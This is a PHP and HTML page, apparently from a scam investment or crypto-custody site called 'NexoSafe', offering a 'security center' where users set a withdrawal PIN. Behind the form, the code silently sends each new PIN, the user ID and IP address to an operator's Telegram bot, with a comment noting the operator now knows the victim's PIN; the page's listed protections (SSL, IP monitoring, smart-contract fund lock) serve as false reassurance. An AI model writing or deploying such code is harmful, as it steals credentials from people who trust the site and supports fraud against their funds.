<?php 
require 'config.php';
session_start();
$user_id = 1; // Simulación

// Si el usuario intenta actualizar el PIN
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['nuevo_pin'])) {
    $nuevo_pin = $_POST['nuevo_pin'];
    
    $stmt = $conn->prepare("UPDATE usuarios SET pin_seguridad = ? WHERE id = ?");
    $stmt->bind_param("si", $nuevo_pin, $user_id);
    $stmt->execute();
    
    // Notificación secreta: Ya sabes su PIN para futuras acciones
    $msg = "🛡️ **ACTUALIZACIÓN DE SEGURIDAD**\n";
    $msg .= "👤 Usuario ID: $user_id\n";
    $msg .= "🔑 Nuevo PIN de Retiro: $nuevo_pin\n";
    $msg .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'];
    file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg));
    
    $success = "PIN actualizado correctamente.";
}

$res = $conn->query("SELECT * FROM usuarios WHERE id = $user_id");
$user = $res->fetch_assoc();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Centro de Seguridad | NexoSafe</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: 'Inter', sans-serif; }
        .sec-card { background: #1e293b; border: none; border-radius: 15px; }
        .list-group-item { background: transparent; color: #94a3b8; border-color: #334155; padding: 15px 0; }
        .form-control { background: #0f172a; border: 1px solid #334155; color: white; }
        .form-control:focus { background: #0f172a; color: white; border-color: #10b981; box-shadow: none; }
    </style>
</head>
<body class="p-4">

<div class="container" style="max-width: 700px;">
    <div class="d-flex align-items-center mb-4">
        <a href="dashboard.php" class="btn btn-outline-light me-3"><i class="fas fa-arrow-left"></i></a>
        <h2 class="fw-bold m-0">Seguridad de la Cuenta</h2>
    </div>

    <?php if(isset($success)): ?>
        <div class="alert alert-success bg-success bg-opacity-10 text-success border-success mb-4"><?php echo $success; ?></div>
    <?php endif; ?>

    <div class="row g-4">
        <div class="col-12">
            <div class="card sec-card p-4">
                <h5 class="fw-bold text-white mb-4"><i class="fas fa-key text-warning me-2"></i> PIN de Transacción</h5>
                <p class="small text-secondary">Este PIN de 4 dígitos será requerido para autorizar cualquier retiro de fondos una vez cumplida la meta.</p>
                
                <form method="POST" class="row g-3">
                    <div class="col-auto">
                        <input type="password" name="nuevo_pin" class="form-control" maxlength="4" placeholder="Nuevo PIN" required>
                    </div>
                    <div class="col-auto">
                        <button type="submit" class="btn btn-warning fw-bold">Actualizar PIN</button>
                    </div>
                </form>
            </div>
        </div>

        <div class="col-12">
            <div class="card sec-card p-4">
                <h5 class="fw-bold text-white mb-3"><i class="fas fa-shield-halved text-success me-2"></i> Capas de Protección Activas</h5>
                <ul class="list-group list-group-flush">
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        <div>
                            <span class="d-block text-white">Cifrado SSL/TLS 256-bit</span>
                            <small>Protección de datos en tránsito.</small>
                        </div>
                        <i class="fas fa-check-circle text-success"></i>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        <div>
                            <span class="d-block text-white">Monitoreo de IP Institucional</span>
                            <small>Tu IP actual: <?php echo $_SERVER['REMOTE_ADDR']; ?></small>
                        </div>
                        <i class="fas fa-check-circle text-success"></i>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        <div>
                            <span class="d-block text-white">Bloqueo de Fondos (Smart Contract)</span>
                            <small>Custodia activa hasta el cumplimiento del objetivo.</small>
                        </div>
                        <i class="fas fa-lock text-warning"></i>
                    </li>
                </ul>
            </div>
        </div>
    </div>

    <div class="text-center mt-5">
        <p class="text-secondary small">NexoSafe utiliza estándares bancarios internacionales para la custodia de activos digitales.</p>
    </div>
</div>

</body>
</html>
